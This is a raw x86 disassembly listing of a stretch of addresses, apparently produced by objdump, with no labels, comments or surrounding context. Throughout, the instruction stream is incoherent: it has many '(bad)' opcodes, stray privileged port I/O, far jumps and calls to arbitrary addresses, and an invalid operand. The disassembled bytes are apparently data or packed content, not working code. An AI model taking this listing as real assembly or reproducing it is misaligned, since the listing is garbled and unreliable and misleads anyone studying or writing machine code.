  4139a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139aa:	rcr    DWORD PTR [ebx-0x71317279],cl
  4139b0:	jbe    0x4139ce
  4139b2:	hlt    
  4139b3:	add    edx,DWORD PTR [ebx]
  4139b5:	out    0xcb,al
  4139b7:	mov    gs,edx
  4139b9:	pop    esi
  4139ba:	mov    edi,0xaf320642
  4139bf:	cli    
  4139c0:	mov    eax,ds:0x4c1bd0a6
  4139c5:	mov    bh,0x28
  4139c7:	add    al,0xee
  4139c9:	inc    edx
  4139ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139cb:	ss dec ecx
  4139cd:	xor    DWORD PTR [eax],edi
  4139cf:	sbb    al,0x8c
  4139d1:	sbb    eax,0x5ba60428
  4139d6:	out    0x9e,eax
  4139d8:	repz ret 
  4139da:	add    cl,ah
  4139dc:	arpl   WORD PTR [edx-0x584ee700],bx
  4139e2:	or     BYTE PTR [ecx+0x17],dl
  4139e5:	mov    dh,0xfd
  4139e7:	pop    esi
  4139e8:	mov    ch,0xee
  4139ea:	push   ecx
  4139eb:	push   esi
  4139ec:	mov    eax,0xa5dd7431
  4139f1:	pop    esi
  4139f2:	pop    eax
  4139f3:	inc    esi
  4139f4:	enter  0xc065,0xb5
  4139f8:	adc    bh,BYTE PTR [ecx+0x5b82ccf7]
  4139fe:	push   eax
  4139ff:	inc    ecx
	...
  413a28:	add    BYTE PTR [eax],al
  413a2a:	push   edi
  413a2b:	mov    ebp,edi
  413a2d:	es or  eax,0x7d2ab2c3
  413a33:	pop    ebx
  413a34:	push   0xbf403de9
  413a39:	add    ebp,0x6de93fb6
  413a3f:	xor    BYTE PTR [ecx+esi*8-0x2b],dh
  413a43:	pop    es
  413a44:	jnp    0x413a3c
  413a46:	mov    ebx,0xb09a8838
  413a4b:	xor    eax,ecx
  413a4d:	stos   DWORD PTR es:[edi],eax
  413a4e:	call   0xc4dd:0xde725530
  413a55:	aad    0x24
  413a57:	pop    ebx
  413a58:	push   0xd
  413a5a:	mov    bl,0xa7
  413a5c:	or     cl,dl
  413a5e:	pop    ss
  413a5f:	mov    al,ds:0x96f5befd
  413a64:	cld    
  413a65:	inc    ebx
  413a66:	push   esp
  413a67:	xor    DWORD PTR [ecx+eiz*8-0x3b],esi
  413a6b:	sar    ch,0xa6
  413a6e:	retf   
  413a6f:	ret    0x9e21
  413a72:	sub    DWORD PTR [ebx-0x18],esp
  413a75:	btc    DWORD PTR [ecx],esi
  413a78:	inc    BYTE PTR [ebx]
  413a7a:	dec    esi
  413a7b:	xor    DWORD PTR [eax+eax*1+0x2f],esi
  413a7f:	aam    0x59
  413a81:	push   DWORD PTR [eax-0x4c8a0122]
  413a87:	fidiv  WORD PTR [eax+ecx*1-0x41]
  413a8b:	pop    ss
  413a8c:	dec    esi
  413a8d:	inc    DWORD PTR [eax]
	...
  413ab7:	add    BYTE PTR [eax+0x2704bff4],ah
  413abd:	imul   ecx,DWORD PTR [ecx+0xc4870ec],0xfd6687e8
  413ac7:	(bad)  
  413ac8:	in     al,dx
  413ac9:	sbb    esi,DWORD PTR [edx+0x24]
  413acc:	(bad)  
  413ace:	fs inc ecx
  413ad0:	xlat   BYTE PTR ds:[ebx]
  413ad1:	imul   ebp,eax,0x1c
  413ad4:	enter  0xfede,0x50
  413ad8:	scas   eax,DWORD PTR es:[edi]
  413ad9:	pop    ebx
  413ada:	add    bh,ch
  413adc:	jno    0x413b2d
  413ade:	xor    ah,BYTE PTR [esi-0x6a]
  413ae1:	pop    ebx
  413ae2:	push   eax
  413ae3:	jmp    FWORD PTR [edx-0x3cf819cd]
  413ae9:	fdivp  st(6),st
  413aeb:	call   0x3ea587
  413af0:	pop    esi
  413af1:	sbb    eax,0xb2ca0006
  413af6:	jmp    0x6821267e
  413afb:	add    ch,ch
  413afd:	pop    ds
  413afe:	push   DWORD PTR [ebp-0x61]
  413b01:	shr    DWORD PTR [edi],cl
  413b03:	push   eax
  413b04:	jo     0x413ae4
  413b06:	mov    BYTE PTR [ebp-0x7d],al
  413b09:	push   ecx
  413b0a:	sbb    bh,bh
  413b0c:	sub    ch,BYTE PTR [edi]
  413b0e:	out    0xaa,al
  413b10:	mov    al,0xde
  413b12:	(bad)  
  413b13:	push   0x34
  413b15:	fidiv  WORD PTR [eax+ecx*1-0x51]
  413b19:	mov    ebx,0xfffe
	...
  413b46:	mov    al,0x51
  413b48:	sbb    al,0xff
  413b4a:	ds dec edi
  413b4c:	cld    
  413b4d:	out    0xa8,eax
  413b4f:	loopne 0x413add
  413b51:	(bad)  
  413b52:	cmp    DWORD PTR [eax],esi
  413b54:	mov    ?,esi
  413b56:	stos   DWORD PTR es:[edi],eax
  413b57:	sub    al,0x9a
  413b59:	dec    ebx
  413b5a:	mov    fs,WORD PTR [ebp+0x38fcc88c]
  413b60:	add    dl,BYTE PTR [ebp-0x3b]
  413b63:	mov    BYTE PTR [eax+0x17e616c3],al
  413b69:	add    BYTE PTR [esi+eax*2-0x63c98b75],dl
  413b70:	pushf  
  413b71:	dec    esi
  413b72:	stc    
  413b73:	xchg   ebp,eax
  413b74:	jp     0x413bba
  413b76:	repnz test eax,0x37631ce
  413b7c:	add    al,BYTE PTR [eax+0x47164421]
  413b82:	data16 cmp ah,BYTE PTR [ecx+eax*2]
  413b86:	ds in  eax,0x99
  413b89:	adc    DWORD PTR [ecx],ecx
  413b8b:	inc    esp
  413b8c:	add    cl,BYTE PTR [ebx]
  413b8e:	dec    al
  413b90:	xlat   BYTE PTR ds:[ebx]
  413b91:	push   esi
  413b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b93:	fisubr WORD PTR ds:0xc229b1ff
  413b99:	jae    0x413bf9
  413b9b:	mov    ebx,0x4416f846
  413ba0:	add    ch,bh
  413ba2:	fmul   DWORD PTR [ebp+eax*2-0x74bc009a]
  413ba9:	je     0x413bab
	...
  413bd3:	add    BYTE PTR [esi-0x69f7effb],al
  413bd9:	call   0xf810:0x1579ff0d
  413be0:	data16 je 0x413c19
  413be3:	jmp    FWORD PTR [ecx-0x18]
  413be6:	aad    0xbf
  413be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be9:	std    
  413bea:	mov    esi,edi
  413bec:	pop    ecx
  413bed:	pop    ebx
  413bee:	cdq    
  413bef:	pop    edx
  413bf0:	or     DWORD PTR [esi+0x14],edx
  413bf3:	dec    ebp
  413bf4:	dec    eax
  413bf5:	test   al,0x93
  413bf7:	mov    ecx,edx
  413bf9:	bound  edi,QWORD PTR [edi-0x4f]
  413bfc:	mov    BYTE PTR [esi],ch
  413bfe:	xchg   DWORD PTR [ebx],ebp
  413c00:	pop    es
  413c01:	sbb    esp,esp
  413c03:	add    edx,DWORD PTR [ebx-0x2787c1e]
  413c09:	ss pop ss
  413c0b:	push   ds
  413c0c:	shl    DWORD PTR ds:[esi],0x8b
  413c10:	mov    ah,BYTE PTR [ebx+0x4f]
  413c13:	adc    edi,DWORD PTR [ecx+0x2e]
  413c16:	push   edi
  413c17:	jge    0x413c93
  413c19:	das    
  413c1a:	arpl   cx,cx
  413c1c:	das    
  413c1d:	mov    ds:0x6dbe03a8,eax
  413c22:	out    0xf,eax
  413c24:	add    ebx,0x5b7f219f
  413c2a:	xchg   esi,eax
  413c2b:	fwait
  413c2c:	mov    bh,0x6c
  413c2e:	out    0x3,eax
  413c30:	inc    ebp
  413c31:	sbb    edx,DWORD PTR [ebp+ebx*8+0x2f064370]
	...
  413c60:	add    BYTE PTR [eax],al
  413c62:	shr    DWORD PTR ds:0x7b2dc3e3,0x70
  413c69:	inc    ecx
  413c6a:	mov    dh,0xc2
  413c6c:	out    0x3,eax
  413c6e:	cdq    
  413c6f:	in     al,dx
  413c70:	jg     0x413ca6
  413c72:	sbb    BYTE PTR [edi+eiz*8-0x18cced76],bl
  413c79:	adc    BYTE PTR [esi+0x43],al
  413c7c:	fimul  DWORD PTR ds:0x10d72d89
  413c82:	xchg   BYTE PTR [edx-0x30],al
  413c85:	xor    al,0x79
  413c87:	sub    eax,0xf3b1d6c4
  413c8c:	mov    esi,0x12d688a
  413c91:	mov    ebx,0x34056607
  413c96:	or     esi,DWORD PTR [esi-0x104b1700]
  413c9c:	push   0x9c1c38
  413ca1:	add    eax,esp
  413ca3:	mov    bh,0x3f
  413ca5:	jmp    0x9149e46e
  413caa:	sub    eax,0x4b7efdb2
  413caf:	pop    ebx
  413cb0:	push   0x9a5c13
  413cb5:	add    DWORD PTR [edi-0x3b16c04a],edi
  413cbb:	scas   al,BYTE PTR es:[di]
  413cbd:	mov    cl,0x82
  413cbf:	pop    ebx
  413cc0:	call   0xfe6d8e02
  413cc5:	pusha  
	...
  413cee:	add    BYTE PTR [eax],al
  413cf0:	jle    0x413d31
  413cf2:	imul   ebp,ecx,0x55
  413cf5:	mov    ah,0x66
  413cf7:	test   al,0x3d
  413cf9:	ret    
  413cfa:	or     edi,0x7a
  413cfd:	pop    ebx
  413cfe:	std    
  413cff:	hlt    
  413d00:	ja     0x413c96
  413d02:	aas    
  413d03:	jmp    0x1e962fbd
  413d08:	mov    ah,0xe3
  413d0a:	inc    ebx
  413d0b:	sbb    eax,0x9a685b23
  413d10:	pop    edi
  413d11:	call   0xe93f:0xb6be9100
  413d18:	mov    ah,0x67
  413d1a:	scas   al,BYTE PTR es:[edi]
  413d1b:	mov    eax,ds:0x49e85afa
  413d20:	imul   ebp,DWORD PTR [esi+edi*8],0x8c2b5170
  413d27:	and    al,0xde
  413d29:	pushf  
  413d2a:	push   0x9a5c55
  413d2f:	inc    ecx
  413d30:	stc    
  413d31:	mov    ch,0x3f
  413d33:	add    BYTE PTR [edi-0x1d],ah
  413d36:	xor    al,0xae
  413d38:	das    
  413d39:	cwde   
  413d3a:	add    al,ch
  413d3c:	shr    DWORD PTR [edx-0x3],cl
  413d3f:	(bad)  
  413d40:	fisubr WORD PTR [ebx-0x18]
  413d43:	sbb    DWORD PTR [edx],0xffffffcb
  413d46:	std    
  413d47:	jae    0x413d58
  413d49:	(bad)  
  413d4a:	jl     0x413d3c
  413d4c:	push   edi
  413d4d:	pop    esp
  413d4e:	inc    edx
  413d4f:	or     DWORD PTR [edx-0x2d],0xfffffffd
  413d53:	jae    0x413d55
	...
  413d7d:	add    bl,bh
  413d7f:	dec    edi
  413d80:	(bad)  
  413d81:	(bad)  
  413d82:	mov    eax,0x1f75fea0
  413d87:	sar    dl,1
  413d89:	dec    ebp
  413d8a:	test   al,0xe2
  413d8c:	(bad)  
  413d8d:	jne    0x413e02
  413d8f:	loop   0x413e05
  413d91:	or     BYTE PTR [edi+0x65],ch
  413d94:	dec    esi
  413d95:	jmp    FWORD PTR [eax-0x1e]
  413d98:	je     0x413d8a
  413d9a:	mov    BYTE PTR [eax+ecx*1-0x18],bl
  413d9e:	mov    al,ds:0x28fffd71
  413da3:	pop    esp
  413da4:	in     al,dx
  413da5:	jmp    DWORD PTR [edx-0x46c319d1]
  413dab:	loop   0x413dab
  413dad:	push   DWORD PTR [edx+0x2f75fecb]
  413db3:	loop   0x413e29
  413db5:	or     BYTE PTR [edi],bh
  413db7:	push   ebp
  413db8:	dec    esi
  413db9:	dec    DWORD PTR [eax-0x1e]
  413dbc:	je     0x413daa
  413dbe:	dec    edi
  413dbf:	es push ecx
  413dc1:	jmp    FWORD PTR [eax+0x3ff474e2]
  413dc7:	cs push ecx
  413dc9:	jmp    FWORD PTR [eax+0x6ff074e2]
  413dcf:	push   esi
  413dd0:	dec    edi
  413dd1:	jmp    FWORD PTR [eax-0x1e]
  413dd4:	je     0x413dbe
  413dd6:	sbb    cl,BYTE PTR ds:[ebp-0x76e386b1]
  413ddd:	je     0x413e51
  413ddf:	adc    al,0xf
  413de1:	or     BYTE PTR [eax],al
	...
  413e0b:	add    BYTE PTR [esi-0x65],dl
  413e0e:	cmp    bh,bh
  413e10:	popa   
  413e11:	inc    esp
  413e12:	mov    ecx,0x2f4242c1
  413e17:	mov    esp,DWORD PTR [edx-0x40]
  413e1a:	mov    ebp,0x1c41d4fb
  413e1f:	inc    eax
  413e20:	inc    ecx
  413e21:	dec    esi
  413e22:	cld    
  413e23:	out    0x4f,eax
  413e25:	dec    edx
  413e26:	xchg   esi,edi
  413e28:	(bad)  
  413e29:	ja     0x413db3
  413e2b:	imul   edi,DWORD PTR [esi],0xe768044e
  413e31:	pop    edx
  413e32:	inc    ecx
  413e33:	add    BYTE PTR [esi-0x41fffdcc],ah
  413e39:	mov    WORD PTR [edx+edx*2-0x400375f7],gs
  413e40:	mov    dl,BYTE PTR [ebp+0x34]
  413e43:	call   0xfeca2d0d
  413e48:	inc    ebp
  413e49:	je     0x413e58
  413e4b:	sbb    DWORD PTR [esi-0x2efffdf4],ecx
  413e51:	mov    dl,0x19
  413e53:	mov    ah,0x60
  413e55:	repz add DWORD PTR [eax-0x2f],edx
  413e59:	(bad)  
  413e5a:	stc    
  413e5b:	out    0xad,eax
  413e5d:	sti    
  413e5e:	mov    dh,bh
  413e60:	(bad)  
  413e61:	mov    al,0x31
  413e63:	(bad)  
  413e64:	mov    ecx,0xb1fc0e59
  413e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e6a:	stc    
  413e6b:	out    0x39,eax
  413e6d:	cli    
  413e6e:	mov    dh,bh
	...
  413e98:	add    BYTE PTR [eax],al
  413e9a:	ja     0x413f12
  413e9c:	std    
  413e9d:	push   edx
  413e9f:	mov    esp,0x5b7a8295
  413ea4:	jecxz  0x413ed5
  413ea6:	adc    al,0x5b
  413ea8:	push   ecx
  413ea9:	inc    ebp
  413eaa:	xor    DWORD PTR [eax-0x67506421],0xa0c687ce
  413eb4:	ret    
  413eb5:	jnp    0x413ee1
  413eb7:	ins    DWORD PTR es:[edi],dx
  413eb8:	das    
  413eb9:	inc    ebp
  413eba:	ds fcomi st,st(6)
  413ebd:	add    edx,edx
  413ebf:	call   0x2ee7:0x9bdbaf3f
  413ec6:	push   esi
  413ec7:	adc    ah,bl
  413ec9:	add    edi,DWORD PTR [esi]
  413ecb:	push   esi
  413ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ecd:	adc    BYTE PTR [ebp-0x6e],bl
  413ed0:	jg     0x413eaf
  413ed2:	xchg   edi,eax
  413ed3:	sub    al,BYTE PTR [edi-0x1f511605]
  413ed9:	xor    edx,DWORD PTR [esi-0x246918a5]
  413edf:	mov    dl,0x8c
  413ee1:	push   ds
  413ee2:	jg     0x413f3f
  413ee4:	mov    bh,0x86
  413ee6:	xchg   edx,eax
  413ee7:	push   ebx
  413ee8:	dec    edi
  413ee9:	aad    0x86
  413eeb:	sub    dl,BYTE PTR [edi-0x64]
  413eee:	aaa    
  413eef:	mov    ecx,DWORD PTR [esi-0x79]
  413ef2:	cmc    
  413ef3:	ins    DWORD PTR es:[edi],dx
  413ef4:	daa    
  413ef5:	dec    ebp
  413ef6:	call   0xefc87e24
  413efb:	clc    
  413efc:	out    dx,eax
  413efd:	inc    BYTE PTR [eax]
	...
  413f27:	add    BYTE PTR [edx+0x1b],dl
  413f2a:	das    
  413f2b:	adc    edx,edx
  413f2d:	sub    DWORD PTR [ebp-0x53361e05],ebx
  413f33:	xchg   al,al
  413f35:	mov    DWORD PTR [eax],esp
  413f37:	ret    0x5b3d
  413f3a:	mov    ah,0x7a
  413f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f3d:	(bad)  [ebx]
  413f3f:	mov    BYTE PTR [eax],dl
  413f41:	mov    ch,0xe7
  413f43:	sbb    esp,edi
  413f45:	sub    DWORD PTR [ecx],eax
  413f47:	jl     0x413ede
  413f49:	inc    ecx
  413f4a:	inc    eax
  413f4b:	pushf  
  413f4c:	mov    eax,0xb62c8828
  413f51:	aam    0x3b
  413f53:	sbb    eax,DWORD PTR [edx-0x64]
  413f56:	add    BYTE PTR [ecx-0x80],ch
  413f59:	sub    DWORD PTR [edx+0x29],esi
  413f5c:	push   edx
  413f5d:	cmp    BYTE PTR [edi+0x28],ah
  413f60:	inc    edx
  413f61:	xchg   edx,eax
  413f62:	call   0xfe6ab5ac
  413f67:	loop   0x413fe6
  413f69:	lods   eax,DWORD PTR ds:[esi]
  413f6a:	and    DWORD PTR [esi],edx
  413f6c:	mov    dl,0xf1
  413f6e:	push   edi
  413f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f70:	rcl    BYTE PTR [eax+eax*8+0x15],0x53
  413f75:	cdq    
  413f76:	push   0xbf383de9
  413f7b:	add    esi,ecx
  413f7d:	mov    esi,0x286de93f
  413f82:	je     0x413f75
  413f84:	(bad)
  413f87:	jbe    0x413f49
  413f89:	inc    eax
  413f8a:	enter  0x1e,0x0
	...
  413fb6:	mov    ecx,0x21afd29
  413fbb:	in     al,0xfd
  413fbd:	pop    esi
  413fbe:	mov    eax,0x587f329
  413fc3:	bound  esi,QWORD PTR [ebx+0x29]
  413fc6:	push   edi
  413fc7:	jl     0x413fb1
  413fc9:	cmc    
  413fca:	sbb    DWORD PTR [eax],ebp
  413fcc:	(bad)  
  413fcd:	repnz std 
  413fcf:	lods   al,BYTE PTR ds:[esi]
  413fd0:	and    al,0xc1
  413fd2:	ret    
  413fd3:	mov    esi,0x330de93f
  413fd8:	cdq    
  413fd9:	mov    edx,0x915129c0
  413fde:	cmp    eax,0x5557ed5b
  413fe3:	das    
  413fe4:	addr16 test al,0x3d
  413fe7:	mov    edi,ebp
  413fe9:	add    BYTE PTR [edx],ch
  413feb:	and    al,0xe6
  413fed:	cmp    DWORD PTR [edi+0x23e8fee1],0x71
  413ff4:	std    
  413ff5:	(bad)  
  413ff6:	mov    ebp,0x44dde63d
  413ffb:	fdivp  st(6),st
  413ffd:	or     edx,edi
  413fff:	dec    ebx
  414000:	and    al,0x68
  414002:	imul   eax,DWORD PTR [edi+0x3f],0x68c73700
  414009:	push   ebx
  41400a:	sbb    dh,0x4d
  41400d:	push   0xbeed5c57
  414012:	dec    edx
  414014:	arpl   WORD PTR [ecx+0x67],ax
  414017:	ins    BYTE PTR es:[edi],dx
  414018:	std    
  414019:	jne    0x41401b
	...
  414043:	add    BYTE PTR [edi-0x3c],cl
  414046:	push   ecx
  414047:	js     0x413fe9
  414049:	fsubrp st(5),st
  41404b:	pop    ebp
  41404c:	pusha  
  41404d:	fdivp  st(6),st
  41404f:	dec    DWORD PTR [edx-0x2d]
  414052:	(bad)  
  414053:	jne    0x414084
  414055:	(bad)  
  414056:	int    0x4c
  414058:	mov    al,ds:0xe5c95ede
  41405d:	pop    edx
  41405e:	add    BYTE PTR [ebp-0x64],dl
  414061:	ret    
  414062:	add    ah,0x67
  414065:	mov    al,0x44
  414067:	lock (bad) 
  414069:	fidiv  WORD PTR [esp+ecx*1+0x7f]
  41406d:	(bad)  
  41406e:	push   ecx
  41406f:	inc    DWORD PTR [eax-0x1a8b41de]
  414075:	fidivr DWORD PTR [esp+edi*8-0x2b]
  414079:	push   ebp
  41407a:	and    DWORD PTR [ebx-0x7e9c2c56],ecx
  414080:	iret   
  414081:	mov    ebp,cr6
  414084:	fidiv  WORD PTR ds:[eax+edx*1+0x20]
  414089:	pop    eax
  41408a:	or     al,ch
  41408c:	ds jg  0x4140c6
  41408f:	push   DWORD PTR [ecx-0x5603f2a8]
  414095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414096:	mov    esi,edi
  414098:	sub    ebp,DWORD PTR [edx]
  41409a:	call   0xfb8c:0x853105f4
  4140a1:	and    DWORD PTR [edx],esi
  4140a3:	call   0xfec4a7f3
	...
  4140d0:	add    BYTE PTR [eax],al
  4140d2:	ja     0x4140c7
  4140d4:	cmc    
  4140d5:	call   DWORD PTR [edx]
  4140d7:	mov    ebp,0x97a8295
  4140dc:	sbb    BYTE PTR [eax],al
  4140de:	aam    0x74
  4140e0:	xor    DWORD PTR [esi+esi*1+0xa],0xffffffdd
  4140e5:	dec    ebx
  4140e6:	pop    ecx
  4140e7:	lock jp 0x41412e
  4140ea:	push   edx
  4140eb:	fwait
  4140ec:	add    al,0x6a
  4140ee:	ds dec edx
  4140f0:	lock push WORD PTR [ecx]
  4140f4:	sbb    al,BYTE PTR [edx]
  4140f6:	ds xor al,0x82
  4140f9:	out    0x2f,eax
  4140fb:	fs cmp esi,0x35
  4140ff:	hlt    
  414100:	or     eax,0x8c7fb73f
  414105:	addr16 sahf 
  414107:	push   ebp
  414108:	inc    ecx
  414109:	add    BYTE PTR [ecx],dl
  41410b:	xor    BYTE PTR [edx+0x47947e7],cl
  414111:	add    BYTE PTR ds:0xf9230d74,dh
  414117:	pop    es
  414118:	mov    ah,bh
  41411a:	(bad)
  41411d:	dec    BYTE PTR [esi+0x7ec9310c]
  414123:	xor    al,0x1a
  414125:	add    BYTE PTR [esi],bh
  414127:	popf   
  414128:	inc    ebx
  414129:	imul   edi,DWORD PTR [esi],0x367484c4
  41412f:	pop    ebx
  414130:	setns  BYTE PTR [edx+0x26]
  414134:	pop    ds
  414135:	fwait
	...
  41415e:	add    BYTE PTR [eax],al
  414160:	fist   DWORD PTR [ebp-0x4f4f7bea]
  414166:	setnp  bl
  414169:	xchg   ebp,eax
  41416a:	push   es
  41416b:	test   BYTE PTR [eax+0x1283fbb0],ah
  414171:	push   ebx
  414172:	(bad)  
  414173:	stc    
  414174:	add    eax,0x7fb9ef26
  414179:	pop    edi
  41417a:	out    0xd8,eax
  41417c:	mov    ah,0x37
  41417e:	imul   ecx,DWORD PTR [eax+0x75],0xffffffb1
  414182:	out    0xed,eax
  414184:	std    
  414185:	and    eax,0xf8560c55
  41418a:	xor    al,BYTE PTR [ebx-0x7fdb2ba0]
  414190:	loope  0x4141ec
  414192:	out    0x72,eax
  414194:	xchg   ebx,eax
  414195:	mov    bl,0x3a
  414197:	jmp    0x414197
  414199:	pop    edx
  41419a:	paddsb mm3,mm0
  41419d:	fwait
  41419e:	out    0x82,eax
  4141a0:	mov    dl,0x53
  4141a2:	jg     0x414140
  4141a4:	test   al,0x26
  4141a6:	pop    DWORD PTR [ebx-0x678d84e]
  4141ac:	cmp    DWORD PTR [ebx],esi
  4141ae:	scas   al,BYTE PTR es:[edi]
  4141af:	iret   
  4141b0:	sbb    BYTE PTR [esi],ah
  4141b2:	mov    eax,ds:0x145b3d46
  4141b7:	(bad)  
  4141b8:	adc    eax,0x997c2bda
  4141bd:	pop    ebx
  4141be:	out    0x72,eax
  4141c0:	mov    ebx,0xbdd25
	...
  4141ed:	add    dh,ah
  4141ef:	xor    BYTE PTR [edx-0x42da177e],ah
  4141f5:	psraw  mm5,QWORD PTR [edi-0x6d819411]
  4141fc:	add    BYTE PTR [esi],dh
  4141fe:	mov    ebp,0xbcd97424
  414203:	scas   al,BYTE PTR es:[edi]
  414204:	or     BYTE PTR [ecx],dl
  414206:	add    al,0x92
  414208:	std    
  414209:	push   ds
  41420a:	mov    ebp,0xb71618ae
  41420f:	dec    ecx
  414210:	std    
  414211:	xchg   esp,eax
  414212:	xor    eax,0xbcb3fd33
  414217:	and    al,0x69
  414219:	cmp    esp,DWORD PTR [ebp-0x6909ff66]
  41421f:	push   ebp
  414220:	call   0x9c8d92
  414225:	repnz std 
  414227:	scas   al,BYTE PTR es:[edi]
  414228:	arpl   WORD PTR [ecx-0x4a],dx
  41422b:	mov    esp,0x15e5e93f
  414230:	cmp    ecx,ebp
  414232:	cmp    eax,0x55c143d4
  414237:	jmp    0x26836aa1
  41423c:	je     0x414217
  41423e:	in     eax,0x87
  414240:	cmp    ch,cl
  414242:	cmp    eax,0x341dc052
  414247:	pop    edx
  414248:	inc    ebx
  414249:	mov    eax,ds:0x96109fca
  41424e:	ss push ebp
  414250:	call   0x414323
	...
  414279:	add    BYTE PTR [eax],al
  41427b:	add    BYTE PTR [eax],bl
  41427d:	es (bad) 
  41427f:	push   0xffffffa5
  414281:	and    eax,0x9fcab575
  414286:	cld    
  414287:	add    DWORD PTR [ebx],edi
  414289:	pop    ebx
  41428a:	in     eax,dx
  41428b:	das    
  41428c:	mov    esp,0x95108af
  414291:	xchg   ebx,eax
  414292:	std    
  414293:	pop    esi
  414294:	mov    esp,0xf6560caf
  414299:	pop    esp
  41429a:	call   0xfe673dc1
  41429f:	add    BYTE PTR [eax+0x23],bh
  4142a2:	cli    
  4142a3:	call   DWORD PTR [edx-0x62a117b0]
  4142a9:	fsin   
  4142ab:	call   DWORD PTR [edx-0x3c8a02c0]
  4142b1:	fnstenv [eax+ecx*1+0x4f]
  4142b5:	rol    BYTE PTR [edi-0x1],cl
  4142b8:	dec    eax
  4142b9:	xchg   edi,eax
  4142ba:	mov    edi,0x8b039714
  4142bf:	in     al,dx
  4142c0:	adc    al,0x9c
  4142c2:	cmc    
  4142c3:	push   esi
  4142c4:	and    al,0x9b
  4142c6:	push   esp
  4142c7:	dec    ebx
  4142c8:	out    0x58,al
  4142ca:	add    BYTE PTR [ebx+ebx*1-0x23],dh
  4142ce:	cmp    al,0x50
  4142d0:	dec    esp
  4142d1:	sbb    dh,bh
  4142d3:	call   DWORD PTR [ebx]
  4142d5:	cmp    DWORD PTR cs:0x4115df,0x57
  4142dd:	sub    al,0x68
  4142df:	mov    DWORD PTR [eax],0x0
	...
  414309:	add    BYTE PTR [edx],dl
  41430b:	(bad)  
  41430d:	jmp    DWORD PTR [edi+0x58]
  414310:	lds    eax,FWORD PTR [ebp-0x71]
  414313:	pop    edi
  414314:	add    BYTE PTR [eax],al
  414316:	push   edi
  414317:	aad    0x44
  414319:	cld    
  41431a:	pop    es
  41431b:	aam    0x44
  41431d:	clc    
  41431e:	ja     0x414355
  414320:	(bad)  
  414321:	addr16 dec edx
  414323:	xor    al,BYTE PTR [ecx+0x0]
  414326:	mov    eax,0x564b504b
  41432b:	pop    edi
  41432c:	or     eax,eax
  41432e:	adc    ebx,DWORD PTR [edi]
  414330:	cmp    DWORD PTR [ebp-0x71],0x5f
  414334:	je     0x414373
  414336:	xchg   esp,eax
  414337:	and    al,0xfa
  414339:	add    bl,ah
  41433b:	bound  ecx,QWORD PTR [ecx+0x1bb69b75]
  414341:	push   esi
  414342:	ds mov ecx,0x2a70ff3a
  414348:	xor    DWORD PTR [ebp+0x42],0xd907fa9d
  41434f:	jmp    0x414382
  414351:	dec    DWORD PTR [ebx+0x3a]
  414354:	push   0xffffffdd
  414356:	enter  0x7f74,0x5d
  41435a:	shr    esi,0x79
  41435d:	add    BYTE PTR [eax-0x49837ac3],0x31
  414364:	test   BYTE PTR [edi*4-0x768afded],0x5c
  41436c:	cmc    
  41436d:	sti    
	...
  414396:	add    BYTE PTR [eax],al
  414398:	cdq    
  414399:	push   cs
  41439a:	(bad)  
  41439b:	dec    edx
  41439c:	push   DWORD PTR [ecx]
  41439e:	loopne 0x414368
  4143a0:	jl     0x4143df
  4143a2:	add    dl,BYTE PTR [ebp-0x4b]
  4143a5:	or     eax,0x6072c385
  4143aa:	inc    edi
  4143ab:	inc    esp
  4143ac:	jbe    0x4143df
  4143ae:	add    al,BYTE PTR [eax]
  4143b0:	ds std 
  4143b2:	(bad)  
  4143b3:	repz xor al,BYTE PTR ds:[edx]
  4143b7:	add    BYTE PTR [ecx+0x6e],bl
  4143ba:	adc    al,0x8f
  4143bc:	sti    
  4143bd:	in     eax,dx
  4143be:	push   edx
  4143bf:	ins    BYTE PTR es:[edi],dx
  4143c0:	dec    edx
  4143c1:	xchg   edi,eax
  4143c2:	add    al,0x6a
  4143c4:	ds dec eax
  4143c6:	add    al,0x6a
  4143c8:	ds shl esi,0xfb
  4143cc:	xor    DWORD PTR [eax+0x10],eax
  4143cf:	push   0x3e
  4143d1:	pop    esi
  4143d2:	add    al,0xe8
  4143d4:	inc    ebx
  4143d5:	sbb    al,0x2
  4143d7:	add    BYTE PTR [ebp-0xc],al
  4143da:	cmc    
  4143db:	xor    al,0x6e
  4143dd:	inc    esp
  4143de:	ins    BYTE PTR es:[edi],dx
  4143df:	loopne 0x41445b
  4143e1:	mov    cl,0x80
  4143e3:	mov    BYTE PTR [ebx+0x5b],bh
  4143e6:	pop    edi
  4143e7:	fisub  DWORD PTR [edi+0x5b]
  4143ea:	rol    DWORD PTR [ebx],1
  4143ec:	(bad)  
  4143ed:	and    bl,ch
  4143ef:	jnp    0x4143d9
  4143f1:	test   al,0x4b
  4143f3:	sub    BYTE PTR [edx+0x4f],0xd1
  4143f7:	add    esp,DWORD PTR [ebx+ebx*2+0x4f]
  4143fb:	js     0x4143fd
	...
  414425:	add    BYTE PTR [eax],cl
  414427:	pop    ebx
  414428:	out    0xc,eax
  41442a:	(bad)  
  41442b:	test   al,0xde
  41442d:	or     BYTE PTR [edx+0x23],0x10
  414431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414432:	add    eax,0xfa481f22
  414437:	and    ch,al
  414439:	add    edi,DWORD PTR [esi]
  41443b:	pop    ebx
  41443c:	push   0xfffffffe
  41443e:	test   eax,0x98d17b5b
  414443:	test   al,0xef
  414445:	or     BYTE PTR [edx],0x23
  414448:	add    BYTE PTR [eax+0xce75b51],al
  41444e:	jle    0x4143f7
  414450:	es aam 0x78
  414453:	test   al,0xef
  414455:	imul   ecx,DWORD PTR ds:0x703e76a,0x5e
  41445c:	test   al,0x8b
  41445e:	mov    DWORD PTR [esi],esi
  414460:	adc    al,BYTE PTR [ecx+edx*1+0x78283450]
  414467:	pop    ebx
  414468:	out    0xd2,eax
  41446a:	popa   
  41446b:	(bad)  
  41446c:	test   BYTE PTR [ebx],0x3e
  41446f:	push   esi
  414470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414471:	clc    
  414472:	push   edx
  414473:	mov    esi,DWORD PTR [edi]
  414475:	ins    BYTE PTR es:[edi],dx
